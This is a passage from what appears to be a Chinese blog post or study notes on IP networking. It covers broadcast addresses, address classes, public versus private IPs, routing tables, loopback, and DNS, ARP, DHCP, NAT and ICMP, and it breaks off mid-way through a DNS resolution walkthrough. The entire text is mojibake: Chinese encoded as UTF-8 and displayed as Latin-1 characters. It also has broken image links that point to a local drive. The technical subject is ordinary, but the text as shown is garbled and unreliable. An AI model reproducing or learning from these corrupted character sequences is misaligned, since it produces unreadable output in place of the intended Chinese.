å†å°†è¿™ä¸ªåœ°å€ç”¨åè¿›åˆ¶è¡¨ç¤ºï¼Œåˆ™ä¸º  172.20.255.255ã€‚ å¹¿æ’­åœ°å€å¯ä»¥åˆ†ä¸ºæœ¬åœ°å¹¿æ’­å’Œç›´æ¥å¹¿æ’­ä¸¤ç§ã€‚</p><p>åœ¨æœ¬ç½‘ç»œå†…å¹¿æ’­çš„å«åšæœ¬åœ°å¹¿æ’­ã€‚ä¾‹å¦‚ç½‘ç»œåœ°å€ä¸º 192.168.0.0&#x2F;24 çš„æƒ…å†µä¸‹ï¼Œ å¹¿æ’­åœ°å€æ˜¯ 192.168.0.255 ã€‚å› ä¸ºè¿™ä¸ªå¹¿æ’­åœ°å€çš„ IP åŒ…ä¼šè¢«è·¯ç”±å™¨å±è”½ï¼Œæ‰€ä»¥ ä¸ä¼šåˆ°è¾¾ 192.168.0.0&#x2F;24 ä»¥å¤–çš„å…¶ä»–é“¾è·¯ä¸Šã€‚ </p><p>åœ¨ä¸åŒç½‘ç»œä¹‹é—´çš„å¹¿æ’­å«åšç›´æ¥å¹¿æ’­ã€‚ä¾‹å¦‚ç½‘ç»œåœ°å€ä¸º 192.168.0.0&#x2F;24 çš„ä¸»æœº å‘ 192.168.1.255&#x2F;24 çš„ç›®æ ‡åœ°å€å‘é€ IP åŒ…ã€‚æ”¶åˆ°è¿™ä¸ªåŒ…çš„è·¯ç”±å™¨ï¼Œå°†æ•°æ®è½¬å‘ ç»™192.168.1.0&#x2F;24ï¼Œä»è€Œä½¿å¾—æ‰€æœ‰ 192.168.1.1~192.168.1.254 çš„ä¸»æœºéƒ½èƒ½æ”¶åˆ° è¿™ä¸ªåŒ…ï¼ˆç”±äºç›´æ¥å¹¿æ’­æœ‰ä¸€å®šçš„å®‰å…¨é—®é¢˜ï¼Œå¤šæ•°æƒ…å†µä¸‹ä¼šåœ¨è·¯ç”±å™¨ä¸Šè®¾ç½®ä¸ºä¸è½¬ å‘ï¼‰</p><p>![image-20241114203856867](F:\new myblog\STUDY\source\img\image-20241114203856867.png)</p><p> D ç±»å’Œ E ç±»åœ°å€æ˜¯æ²¡æœ‰ä¸»æœºå·çš„ï¼Œæ‰€ä»¥ä¸å¯ç”¨äºä¸»æœº IPï¼ŒD ç±»å¸¸è¢«ç”¨äºå¤šæ’­ï¼ŒE  ç±»æ˜¯é¢„ç•™çš„åˆ†ç±»ï¼Œæš‚æ—¶æœªä½¿ç”¨ï¼Œä¸ç®¡æ˜¯è·¯ç”±å™¨è¿˜æ˜¯ä¸»æœºè§£æåˆ°ä¸€ä¸ª IP åœ°å€æ—¶å€™ï¼Œæˆ‘ä»¬åˆ¤æ–­å…¶ IP åœ°å€çš„é¦–ä½æ˜¯å¦ä¸º  0ï¼Œä¸º 0 åˆ™ä¸º A ç±»åœ°å€ï¼Œé‚£ä¹ˆå°±èƒ½å¾ˆå¿«çš„æ‰¾å‡ºç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ã€‚ å…¶ä½™åˆ†ç±»åˆ¤æ–­æ–¹å¼å‚è€ƒå¦‚ä¸‹å›¾</p><p>![image-20241114204000116](F:\new myblog\STUDY\source\img\image-20241114204000116.png)</p><p>å…¬æœ‰IPä¸ç§æœ‰IPåœ°å€  åœ¨ Aã€Bã€C åˆ†ç±»åœ°å€ï¼Œå®é™…ä¸Šæœ‰åˆ†å…¬æœ‰ IP åœ°å€å’Œ ç§æœ‰ IP åœ°å€</p><p>![image-20241114204019915](F:\new myblog\STUDY\source\img\image-20241114204019915.png)</p><p>å¹³æ—¶æˆ‘ä»¬åŠå…¬å®¤ã€å®¶é‡Œã€å­¦æ ¡ç”¨çš„ IP åœ°å€ï¼Œä¸€èˆ¬éƒ½æ˜¯ç§æœ‰ IP åœ°å€ã€‚å› ä¸ºè¿™äº›åœ°å€å… è®¸ç»„ç»‡å†…éƒ¨çš„ IT äººå‘˜è‡ªå·±ç®¡ç†ã€è‡ªå·±åˆ†é…ï¼Œè€Œä¸”å¯ä»¥é‡å¤ã€‚å› æ­¤ï¼Œä½ å­¦æ ¡çš„æŸä¸ªç§ æœ‰ IP åœ°å€å’Œæˆ‘å­¦æ ¡çš„å¯ä»¥æ˜¯ä¸€æ ·çš„ã€‚</p><p> å°±åƒæ¯ä¸ªå°åŒºéƒ½æœ‰è‡ªå·±çš„æ¥¼ç¼–å·å’Œé—¨ç‰Œå·ï¼Œä½ å°åŒºå®¶å¯ä»¥å«  1 æ ‹ 101 å·ï¼Œæˆ‘å°åŒºå®¶ ä¹Ÿå¯ä»¥å« 1 æ ‹ 101ï¼Œæ²¡æœ‰ä»»ä½•é—®é¢˜ã€‚ä½†ä¸€æ—¦å‡ºäº†å°åŒºï¼Œå°±éœ€è¦å¸¦ä¸Šä¸­å±±è·¯ 666 å· ï¼ˆå…¬ç½‘ IP åœ°å€ï¼‰ï¼Œæ˜¯å›½å®¶ç»Ÿä¸€åˆ†é…çš„ï¼Œä¸èƒ½ä¸¤ä¸ªå°åŒºéƒ½å«ä¸­å±±è·¯ 666ã€‚ </p><p>æ‰€ä»¥ï¼Œå…¬æœ‰ IP åœ°å€æ˜¯æœ‰ä¸ªç»„ç»‡ç»Ÿä¸€åˆ†é…çš„ï¼Œå‡è®¾ä½ è¦å¼€ä¸€ä¸ªåšå®¢ç½‘ç«™ï¼Œé‚£ä¹ˆä½ å°±éœ€ è¦å»ç”³è¯·è´­ä¹°ä¸€ä¸ªå…¬æœ‰ IPï¼Œè¿™æ ·å…¨ä¸–ç•Œçš„äººæ‰èƒ½è®¿é—®ã€‚å¹¶ä¸”å…¬æœ‰ IP åœ°å€åŸºæœ¬ä¸Šè¦åœ¨ æ•´ä¸ªäº’è”ç½‘èŒƒå›´å†…ä¿æŒå”¯ä¸€</p><h4 id="IP-åœ°å€ä¸è·¯ç”±æ§åˆ¶"><a href="#IP-åœ°å€ä¸è·¯ç”±æ§åˆ¶" class="headerlink" title="IP åœ°å€ä¸è·¯ç”±æ§åˆ¶"></a>IP åœ°å€ä¸è·¯ç”±æ§åˆ¶</h4><p> IPåœ°å€çš„ç½‘ç»œåœ°å€è¿™ä¸€éƒ¨åˆ†æ˜¯ç”¨äºè¿›è¡Œè·¯ç”±æ§åˆ¶ã€‚ è·¯ç”±æ§åˆ¶è¡¨ä¸­è®°å½•ç€ç½‘ç»œåœ°å€ä¸ä¸‹ä¸€æ­¥åº”è¯¥å‘é€è‡³è·¯ç”±å™¨çš„åœ°å€ï¼Œåœ¨ä¸»æœºå’Œè·¯ç”±å™¨ä¸Š éƒ½ä¼šæœ‰å„è‡ªçš„è·¯ç”±å™¨æ§åˆ¶è¡¨ã€‚ åœ¨å‘é€ IP åŒ…æ—¶ï¼Œé¦–å…ˆè¦ç¡®å®š IP åŒ…é¦–éƒ¨ä¸­çš„ç›®æ ‡åœ°å€ï¼Œå†ä»è·¯ç”±æ§åˆ¶è¡¨ä¸­æ‰¾åˆ°ä¸è¯¥åœ° å€å…·æœ‰ç›¸åŒç½‘ç»œåœ°å€çš„è®°å½•ï¼Œæ ¹æ®è¯¥è®°å½•å°† IP åŒ…è½¬å‘ç»™ç›¸åº”çš„ä¸‹ä¸€ä¸ªè·¯ç”±å™¨ã€‚å¦‚æœ è·¯ç”±æ§åˆ¶è¡¨ä¸­å­˜åœ¨å¤šæ¡ç›¸åŒç½‘ç»œåœ°å€çš„è®°å½•ï¼Œå°±é€‰æ‹©ç›¸åŒä½æ•°æœ€å¤šçš„ç½‘ç»œåœ°å€ï¼Œä¹Ÿå°±æ˜¯æœ€é•¿åŒ¹é…</p><p>![image-20241114204120253](F:\new myblog\STUDY\source\img\image-20241114204120253.png)</p><p>ä¼ è¾“è¿‡ç¨‹è¯¦è§£</p><ol><li><strong>ä¸»æœº A å‘èµ· IP åŒ…çš„ä¼ è¾“</strong><ul><li><strong>æº IP åœ°å€</strong>ï¼š10.1.1.30ï¼ˆä¸»æœº A çš„ IP åœ°å€ï¼‰</li><li><strong>ç›®æ ‡ IP åœ°å€</strong>ï¼š10.1.2.10ï¼ˆç›®æ ‡ä¸»æœºçš„ IP åœ°å€ï¼‰</li><li>å½“ä¸»æœº A è¦å°† IP åŒ…å‘é€ç»™ç›®æ ‡åœ°å€ 10.1.2.10 æ—¶ï¼Œå®ƒé¦–å…ˆä¼šæŸ¥æ‰¾è‡ªå·±çš„<strong>è·¯ç”±è¡¨</strong>ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰é€šå¾€ 10.1.2.10 çš„ç›´æ¥è·¯å¾„ã€‚</li><li><strong>æŸ¥æ‰¾è·¯ç”±è¡¨</strong>ï¼šç”±äºä¸»æœº A çš„è·¯ç”±è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„æ¡ç›®ï¼Œå®ƒå°†æ­¤åŒ…è½¬å‘ç»™<strong>é»˜è®¤ç½‘å…³</strong>ï¼Œå³ <strong>è·¯ç”±å™¨ 1</strong>ã€‚</li></ul></li><li><strong>è·¯ç”±å™¨ 1 æ”¶åˆ° IP åŒ…</strong><ul><li>è·¯ç”±å™¨ 1 æ¥æ”¶åˆ°äº†ä¸»æœº A å‘æ¥çš„ IP åŒ…ï¼Œå¼€å§‹æŸ¥æ‰¾è‡ªå·±çš„<strong>è·¯ç”±è¡¨</strong>ï¼Œè¯•å›¾æ‰¾åˆ°é€šå‘ç›®æ ‡ IP åœ°å€ï¼ˆ10.1.2.10ï¼‰çš„è·¯ç”±ã€‚</li><li><strong>åŒ¹é…è·¯ç”±è¡¨</strong>ï¼šåœ¨è·¯ç”±è¡¨ä¸­ï¼Œè·¯ç”±å™¨ 1 æ‰¾åˆ°äº†ä¸€ä¸ªåŒ¹é…çš„æ¡ç›®ï¼Œå®ƒçŸ¥é“å¯ä»¥é€šè¿‡å°†åŒ…å‘é€ç»™ <strong>è·¯ç”±å™¨ 2</strong>ï¼ˆIP åœ°å€ä¸º 10.1.0.2ï¼‰æ¥è¾¾åˆ°ç›®æ ‡ç½‘ç»œã€‚</li><li><strong>è½¬å‘ IP åŒ…</strong>ï¼šäºæ˜¯ï¼Œè·¯ç”±å™¨ 1 å°† IP åŒ…è½¬å‘ç»™äº† <strong>è·¯ç”±å™¨ 2</strong>ã€‚</li></ul></li><li><strong>è·¯ç”±å™¨ 2 æ”¶åˆ° IP åŒ…</strong><ul><li>è·¯ç”±å™¨ 2 æ¥æ”¶åˆ°äº†ä»è·¯ç”±å™¨ 1 è½¬å‘è¿‡æ¥çš„ IP åŒ…ï¼ŒåŒæ ·ä¼šåœ¨è‡ªå·±çš„<strong>è·¯ç”±è¡¨</strong>ä¸­æŸ¥æ‰¾æ˜¯å¦æœ‰é€šå¾€ç›®æ ‡åœ°å€ 10.1.2.10 çš„è·¯å¾„ã€‚</li><li><strong>æŸ¥æ‰¾è·¯ç”±è¡¨</strong>ï¼šè·¯ç”±å™¨ 2 çš„è·¯ç”±è¡¨ä¸­å‘ç°äº†ç›®æ ‡ç½‘ç»œï¼ˆ10.1.2.0&#x2F;24ï¼‰ï¼Œå¹¶ç¡®å®šå¯ä»¥é€šè¿‡å…¶æ¥å£ 10.1.2.1 åˆ°è¾¾è¯¥ç½‘ç»œã€‚</li><li><strong>è½¬å‘ IP åŒ…</strong>ï¼šäºæ˜¯ï¼Œè·¯ç”±å™¨ 2 å°† IP åŒ…é€šè¿‡å…¶ 10.1.2.1 æ¥å£è½¬å‘å‡ºå»ã€‚</li></ul></li><li><strong>ç»è¿‡äº¤æ¢æœºåˆ°è¾¾ç›®æ ‡ä¸»æœº</strong><ul><li>å½“ IP åŒ…ä»è·¯ç”±å™¨ 2 çš„ 10.1.2.1 æ¥å£å‘å‡ºåï¼Œè¿›å…¥åˆ°äº¤æ¢æœºã€‚</li><li>äº¤æ¢æœºä¼šæ ¹æ®<strong>ç›®æ ‡ MAC åœ°å€</strong>ï¼Œå°† IP åŒ…ä¼ é€’ç»™åœ¨åŒä¸€å±€åŸŸç½‘ä¸­çš„ç›®æ ‡ä¸»æœº 10.1.2.10ã€‚</li><li><strong>æœ€ç»ˆç›®çš„åœ°</strong>ï¼šç›®æ ‡ä¸»æœº 10.1.2.10 æ”¶åˆ°äº†æ¥è‡ªä¸»æœº Aï¼ˆ10.1.1.30ï¼‰çš„ IP åŒ…ã€‚</li></ul></li></ol><p><strong>è·¯ç”±å™¨çš„ä½œç”¨</strong>ï¼šåœ¨ç½‘ç»œä¸­ï¼Œä¸åŒç½‘ç»œä¹‹é—´çš„é€šä¿¡ç”±è·¯ç”±å™¨è´Ÿè´£ï¼Œè·¯ç”±å™¨é€šè¿‡<strong>è·¯ç”±è¡¨</strong>æ¥ç¡®å®šæ•°æ®åŒ…çš„è½¬å‘è·¯å¾„ã€‚</p><p><strong>è·¯ç”±æŸ¥æ‰¾</strong>ï¼šæ¯ä¸ªè·¯ç”±å™¨æ”¶åˆ° IP åŒ…åéƒ½ä¼šæŸ¥æ‰¾è‡ªå·±çš„è·¯ç”±è¡¨ï¼Œæ‰¾åˆ°é€šå¾€ç›®æ ‡åœ°å€çš„æœ€ä½³è·¯å¾„ï¼Œç„¶åé€è·³è½¬å‘ï¼Œç›´åˆ°åŒ…æŠµè¾¾ç›®æ ‡ç½‘ç»œã€‚</p><p><strong>é€è·³è½¬å‘</strong>ï¼šIP åŒ…ä¼šç»è¿‡å¤šä¸ªè·¯ç”±å™¨ï¼Œæ¯ä¸ªè·¯ç”±å™¨éƒ½ä¼šæ›´æ–°åŒ…çš„ MAC åœ°å€ï¼ˆæº MAC å’Œç›®æ ‡ MACï¼‰ï¼Œä½†<strong>æº IP å’Œç›®æ ‡ IP å§‹ç»ˆä¸å˜</strong>ã€‚</p><p><strong>å±€åŸŸç½‘å†…çš„ä¼ è¾“</strong>ï¼šå½“ IP åŒ…åˆ°è¾¾ç›®æ ‡ç½‘ç»œåï¼Œé€šå¸¸ä¼šé€šè¿‡äº¤æ¢æœºç­‰å±€åŸŸç½‘è®¾å¤‡æœ€ç»ˆä¼ é€’åˆ°ç›®æ ‡ä¸»æœºã€‚</p><p>ç¯å›åœ°å€æ˜¯åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šçš„ç¨‹åºä¹‹é—´è¿›è¡Œç½‘ç»œé€šä¿¡æ—¶æ‰€ä½¿ç”¨çš„ä¸€ä¸ªé»˜è®¤åœ°å€ã€‚ è®¡ç®—æœºä½¿ç”¨ä¸€ä¸ªç‰¹æ®Šçš„ IP åœ°å€ 127.0.0.1 ä½œä¸ºç¯å›åœ°å€ï¼Œä¸è¯¥åœ°å€å…·æœ‰ç›¸åŒæ„ä¹‰çš„ æ˜¯ä¸€ä¸ªå«åš localhost çš„ä¸»æœºåã€‚ ä½¿ç”¨è¿™ä¸ª IP æˆ–ä¸»æœºåæ—¶ï¼Œæ•°æ®åŒ…ä¸ä¼šæµå‘ç½‘ç»œ</p><h2 id="IP-åè®®ç›¸å…³æŠ€æœ¯"><a href="#IP-åè®®ç›¸å…³æŠ€æœ¯" class="headerlink" title="IP åè®®ç›¸å…³æŠ€æœ¯"></a>IP åè®®ç›¸å…³æŠ€æœ¯</h2><h3 id="1-DNSï¼ˆåŸŸåç³»ç»Ÿï¼‰"><a href="#1-DNSï¼ˆåŸŸåç³»ç»Ÿï¼‰" class="headerlink" title="1. DNSï¼ˆåŸŸåç³»ç»Ÿï¼‰"></a>1. <strong>DNSï¼ˆåŸŸåç³»ç»Ÿï¼‰</strong></h3><ul><li><strong>ä½œç”¨</strong>ï¼šå°†äººç±»æ˜“è¯»çš„åŸŸåï¼ˆå¦‚ <a href="http://www.example.com)è½¬æ¢ä¸º/">www.example.comï¼‰è½¬æ¢ä¸º</a> IP åœ°å€ï¼ˆå¦‚ 192.168.1.1ï¼‰ï¼Œå› ä¸ºäººä»¬æ›´å®¹æ˜“è®°ä½åŸŸåã€‚</li><li><strong>åŸŸåå±‚çº§</strong>ï¼šåŸŸåå…·æœ‰å±‚çº§å…³ç³»ï¼Œä»å³åˆ°å·¦ä¾æ¬¡ä¸ºï¼šæ ¹åŸŸã€é¡¶çº§åŸŸã€æ¬¡çº§åŸŸã€‚</li><li>å±‚çº§å…³ç³»ç¤ºä¾‹<ul><li><strong>æ ¹ DNS æœåŠ¡å™¨</strong>ï¼šä½äºå±‚çº§çš„æœ€é¡¶å±‚ï¼Œè´Ÿè´£ç®¡ç†é¡¶çº§åŸŸçš„è¯·æ±‚ã€‚</li><li><strong>é¡¶çº§åŸŸ DNS æœåŠ¡å™¨</strong>ï¼šå¦‚ .comã€.netã€.orgï¼Œç®¡ç†è¯¥é¡¶çº§åŸŸä¸‹çš„æ‰€æœ‰å­åŸŸã€‚</li><li><strong>æƒå¨ DNS æœåŠ¡å™¨</strong>ï¼šå¦‚ example.com çš„ DNS æœåŠ¡å™¨ï¼Œè´Ÿè´£æä¾›è¯¥åŸŸä¸‹å…·ä½“ä¸»æœºçš„ IP åœ°å€ã€‚</li></ul></li><li><strong>è§£æè¿‡ç¨‹</strong>ï¼šå½“ä½ è®¿é—® <a href="http://www.example.com/">www.example.com</a> æ—¶ï¼ŒDNS ç³»ç»Ÿä¼šé€å±‚è§£æï¼Œæœ€ç»ˆæ‰¾åˆ°è¯¥åŸŸåçš„ IP åœ°å€ï¼Œå®ŒæˆåŸŸååˆ° IP åœ°å€çš„è½¬æ¢ã€‚</li></ul><hr><h3 id="2-ARPï¼ˆåœ°å€è§£æåè®®ï¼‰å’Œ-RARPï¼ˆé€†åœ°å€è§£æåè®®ï¼‰"><a href="#2-ARPï¼ˆåœ°å€è§£æåè®®ï¼‰å’Œ-RARPï¼ˆé€†åœ°å€è§£æåè®®ï¼‰" class="headerlink" title="2. ARPï¼ˆåœ°å€è§£æåè®®ï¼‰å’Œ RARPï¼ˆé€†åœ°å€è§£æåè®®ï¼‰"></a>2. <strong>ARPï¼ˆåœ°å€è§£æåè®®ï¼‰å’Œ RARPï¼ˆé€†åœ°å€è§£æåè®®ï¼‰</strong></h3><ul><li><p>ARPï¼ˆAddress Resolution Protocolï¼‰</p><p>ç”¨äºå°† IP åœ°å€è§£æä¸º MAC åœ°å€ï¼Œç¡®ä¿åœ¨å±€åŸŸç½‘å†…èƒ½å¤Ÿæ‰¾åˆ°å¯¹åº”è®¾å¤‡ã€‚</p><ul><li>å·¥ä½œè¿‡ç¨‹ï¼šä¸»æœº A æƒ³é€šè¿‡ IP åœ°å€ä¸å±€åŸŸç½‘ä¸­çš„ä¸»æœº B é€šä¿¡ï¼Œä½†éœ€è¦çŸ¥é“ä¸»æœº B çš„ MAC åœ°å€ã€‚ARP å¹¿æ’­è¯·æ±‚åï¼Œä¸»æœº B å“åº”è‡ªå·±çš„ MAC åœ°å€ï¼Œä¸»æœº A å¯ä»¥ç›´æ¥ä¸ä¸»æœº B é€šä¿¡ã€‚</li></ul></li><li><p><strong>RARPï¼ˆReverse ARPï¼‰</strong>ï¼šä¸ ARP ç›¸åï¼ŒRARP æ˜¯é€šè¿‡ MAC åœ°å€æ¥è·å– IP åœ°å€çš„åè®®ï¼Œç”¨äºä¸€äº›è®¾å¤‡åœ¨å¯åŠ¨æ—¶é€šè¿‡ MAC åœ°å€è·å¾— IP åœ°å€ï¼ˆç°åœ¨è¾ƒå°‘ä½¿ç”¨ï¼ŒDHCP é€šå¸¸å¯ä»¥æ›¿ä»£ï¼‰ã€‚</p></li></ul><hr><h3 id="3-DHCPï¼ˆåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼‰"><a href="#3-DHCPï¼ˆåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼‰" class="headerlink" title="3. DHCPï¼ˆåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼‰"></a>3. <strong>DHCPï¼ˆåŠ¨æ€ä¸»æœºé…ç½®åè®®ï¼‰</strong></h3><ul><li><strong>ä½œç”¨</strong>ï¼šåŠ¨æ€ä¸ºè®¾å¤‡åˆ†é… IP åœ°å€ã€å­ç½‘æ©ç ã€ç½‘å…³ã€DNS æœåŠ¡å™¨ç­‰ç½‘ç»œå‚æ•°ï¼Œå‡å°‘æ‰‹åŠ¨é…ç½®çš„éº»çƒ¦ã€‚</li><li>å·¥ä½œæµç¨‹<ol><li><strong>è¯·æ±‚</strong>ï¼šè®¾å¤‡è¿æ¥åˆ°ç½‘ç»œæ—¶ï¼Œå‘é€ DHCP è¯·æ±‚ã€‚</li><li><strong>æä¾›</strong>ï¼šDHCP æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œåˆ†é…ä¸€ä¸ªæœªä½¿ç”¨çš„ IP åœ°å€ï¼Œå¹¶å°†ç›¸å…³ç½‘ç»œå‚æ•°å‘é€ç»™è®¾å¤‡ã€‚</li><li><strong>ç¡®è®¤</strong>ï¼šè®¾å¤‡æ¥å—å¹¶ç¡®è®¤ä½¿ç”¨è¯¥ IP åœ°å€ã€‚</li></ol></li><li><strong>ä¼˜ç‚¹</strong>ï¼šè‡ªåŠ¨åˆ†é… IP åœ°å€ï¼Œé¿å…äº†æ‰‹åŠ¨é…ç½®çš„é”™è¯¯ï¼Œé€‚ç”¨äºåŠ¨æ€å˜åŒ–çš„ç½‘ç»œç¯å¢ƒã€‚</li></ul><hr><h3 id="4-NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰"><a href="#4-NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰" class="headerlink" title="4. NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰"></a>4. <strong>NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰</strong></h3><ul><li><strong>ä½œç”¨</strong>ï¼šç”¨äºå°†ç§æœ‰ IP åœ°å€è½¬æ¢ä¸ºå…¬æœ‰ IP åœ°å€ï¼Œé€šå¸¸ç”¨äºå†…éƒ¨ç½‘ç»œè®¿é—®å¤–éƒ¨ç½‘ç»œï¼ˆå¦‚äº’è”ç½‘ï¼‰ã€‚</li><li>ç±»å‹<ul><li><strong>é™æ€ NAT</strong>ï¼šå°†ç§æœ‰ IP å’Œå…¬æœ‰ IP ä¸€ä¸€æ˜ å°„ã€‚</li><li><strong>åŠ¨æ€ NAT</strong>ï¼šæ ¹æ®éœ€è¦åŠ¨æ€åˆ†é…å…¬æœ‰ IP åœ°å€ã€‚</li><li><strong>PATï¼ˆç«¯å£åœ°å€è½¬æ¢ï¼‰</strong>ï¼šå°†å¤šä¸ªç§æœ‰ IP åœ°å€æ˜ å°„åˆ°åŒä¸€ä¸ªå…¬æœ‰ IP åœ°å€ï¼Œä½†ä½¿ç”¨ä¸åŒçš„ç«¯å£åŒºåˆ†ã€‚</li></ul></li><li><strong>ä¼˜ç‚¹</strong>ï¼šé€šè¿‡ NATï¼Œå¯ä»¥èŠ‚çœå…¬æœ‰ IP åœ°å€ï¼Œå¢å¼ºå†…éƒ¨ç½‘ç»œçš„å®‰å…¨æ€§ï¼Œå› ä¸ºå¤–éƒ¨ç½‘ç»œæ— æ³•ç›´æ¥è®¿é—®ç§æœ‰ IP åœ°å€ã€‚</li></ul><hr><h3 id="5-ICMPï¼ˆäº’è”ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼‰"><a href="#5-ICMPï¼ˆäº’è”ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼‰" class="headerlink" title="5. ICMPï¼ˆäº’è”ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼‰"></a>5. <strong>ICMPï¼ˆäº’è”ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼‰</strong></h3><ul><li><p><strong>ä½œç”¨</strong>ï¼šç”¨äºå‘é€æ§åˆ¶æ¶ˆæ¯ï¼Œæ£€æµ‹ç½‘ç»œè¿æ¥çŠ¶å†µï¼Œé€šå¸¸ç”¨äºè¯Šæ–­å’Œæ•…éšœæ’é™¤ã€‚</p></li><li><p>å¸¸è§ç”¨é€”</p><ul><li><strong>Ping</strong>ï¼šæµ‹è¯•ç›®æ ‡ä¸»æœºæ˜¯å¦å¯è¾¾ï¼Œè¿”å›å“åº”æ—¶é—´ã€‚</li><li><strong>Traceroute</strong>ï¼šæ˜¾ç¤ºæ•°æ®åŒ…ä»æºåˆ°ç›®æ ‡ç»è¿‡çš„æ¯ä¸€è·³çš„ç½‘ç»œè®¾å¤‡ï¼Œå¸®åŠ©åˆ†æç½‘ç»œå»¶è¿Ÿå’Œä¸­æ–­ä½ç½®ã€‚</li></ul></li><li><p><strong>åŠŸèƒ½</strong>ï¼šICMP ä¸ç”¨äºä¼ è¾“æ•°æ®ï¼Œè€Œæ˜¯æä¾›ç½‘ç»œæ•…éšœä¿¡æ¯ã€è¿æ¥æµ‹è¯•ã€è·¯å¾„è¿½è¸ªç­‰å·¥å…·ã€‚</p></li><li><p><strong>DNS</strong> è§£å†³äº†åŸŸååˆ° IP çš„è½¬æ¢ã€‚</p><p><strong>ARP&#x2F;RARP</strong> å®ç°äº† IP åœ°å€ä¸ MAC åœ°å€çš„å¯¹åº”ã€‚</p><p><strong>DHCP</strong> åŠ¨æ€åˆ†é… IP åœ°å€ï¼Œç®€åŒ–ç½‘ç»œé…ç½®ã€‚</p><p><strong>NAT</strong> è¿›è¡Œåœ°å€è½¬æ¢ï¼Œä¼˜åŒ– IP åœ°å€çš„ä½¿ç”¨ã€‚</p><p><strong>ICMP</strong> åˆ™ç”¨äºç½‘ç»œè¯Šæ–­å’Œæ§åˆ¶ï¼Œç¡®ä¿ç½‘ç»œè¿è¡Œæ­£å¸¸ã€‚</p></li></ul><h3 id="DNS-åŸŸåè§£æ"><a href="#DNS-åŸŸåè§£æ" class="headerlink" title="DNS åŸŸåè§£æ"></a>DNS åŸŸåè§£æ</h3><p>![image-20241114204250218](F:\new myblog\STUDY\source\img\image-20241114204250218.png)</p><p>DNS åŸŸåè§£ææµç¨‹</p><ol><li><strong>ç¼“å­˜æ£€æŸ¥</strong>ï¼š<ul><li>æµè§ˆå™¨ä¼šå…ˆæŸ¥æ‰¾è‡ªå·±çš„ç¼“å­˜ï¼Œçœ‹çœ‹æ˜¯å¦å·²æœ‰å¯¹åº”åŸŸåçš„ IP åœ°å€ã€‚</li><li>å¦‚æœæµè§ˆå™¨æ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™å‘æ“ä½œç³»ç»Ÿçš„ç¼“å­˜æŸ¥è¯¢ã€‚</li><li>è‹¥æ“ä½œç³»ç»Ÿçš„ç¼“å­˜ä¸­ä¹Ÿæ²¡æœ‰ï¼Œå†æŸ¥æ‰¾æœ¬åœ°çš„ <strong>hosts æ–‡ä»¶</strong>ã€‚å¦‚æœ <strong>hosts æ–‡ä»¶</strong>ä¸­ä¹Ÿæ²¡æœ‰å¯¹åº”çš„ IP åœ°å€ï¼Œåˆ™è¿›è¡Œ DNS æŸ¥è¯¢ã€‚</li></ul></li><li><strong>å‘æœ¬åœ° DNS æœåŠ¡å™¨å‘èµ·è¯·æ±‚</strong>ï¼š<ul><li>å®¢æˆ·ç«¯å‘<strong>æœ¬åœ° DNS æœåŠ¡å™¨</strong>ï¼ˆé€šå¸¸æ˜¯ç½‘ç»œæä¾›å•†çš„ DNS æœåŠ¡å™¨ï¼‰å‘å‡ºè¯·æ±‚ï¼Œè¯¢é—®ç›®æ ‡åŸŸåï¼ˆå¦‚ <a href="http://www.server.com)çš„/">www.server.comï¼‰çš„</a> IP åœ°å€ã€‚</li></ul></li><li><strong>æœ¬åœ° DNS æŸ¥è¯¢ç¼“å­˜</strong>ï¼š<ul><li>æœ¬åœ° DNS æœåŠ¡å™¨ä¼šå…ˆæŸ¥è¯¢è‡ªå·±çš„ç¼“å­˜ã€‚å¦‚æœç¼“å­˜ä¸­å·²æœ‰è¯¥åŸŸåçš„ IP åœ°å€ï¼Œåˆ™ç›´æ¥è¿”å›ç»“æœã€‚</li><li>å¦‚æœç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™æœ¬åœ° DNS ä¼šå‘<strong>æ ¹åŸŸåæœåŠ¡å™¨</strong>å‘å‡ºè¯·æ±‚ã€‚</li></ul></li><li><strong>æ ¹ DNS æŒ‡å‘é¡¶çº§åŸŸ DNS</strong>ï¼š<ul><li>æ ¹ DNS æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œå‘ç°æŸ¥è¯¢çš„æ˜¯ <code>.com</code> ç»“å°¾çš„åŸŸåã€‚äºæ˜¯ï¼Œå®ƒå‘Šè¯‰æœ¬åœ° DNS å»æ‰¾è´Ÿè´£ <code>.com</code> åŸŸåçš„<strong>é¡¶çº§åŸŸåæœåŠ¡å™¨</strong>ï¼Œå¹¶æä¾›å…¶åœ°å€ã€‚</li></ul></li><li><strong>é¡¶çº§åŸŸ DNS æŒ‡å‘æƒå¨ DNS</strong>ï¼š<ul><li>æœ¬åœ° DNS æœåŠ¡å™¨æ¥åˆ° <code>.com</code> é¡¶çº§åŸŸçš„åœ°å€åï¼Œå‘è¯¥<strong>é¡¶çº§åŸŸåæœåŠ¡å™¨</strong>è¯¢é—® <code>server.com</code> çš„ IP åœ°å€ã€‚</li><li>é¡¶çº§åŸŸåæœåŠ¡å™¨å‘Šè¯‰æœ¬åœ° DNS å»æ‰¾ <code>server.com</code> çš„<strong>æƒå¨ DNS æœåŠ¡å™¨</strong>ï¼Œå¹¶æä¾›å…¶åœ°å€ã€‚</li></ul></li><li><strong>æƒå¨ DNS è¿”å› IP åœ°å€</strong>ï¼š<ul><li>æœ¬åœ° DNS æœåŠ¡å™¨è”ç³» <code>server.com</code> çš„<strong>æƒå¨ DNS æœåŠ¡å™¨</strong>ï¼Œè¯¢é—® <code>www.server.com</code> çš„ IP åœ°å€ã€‚</li><li>æƒå¨ DNS 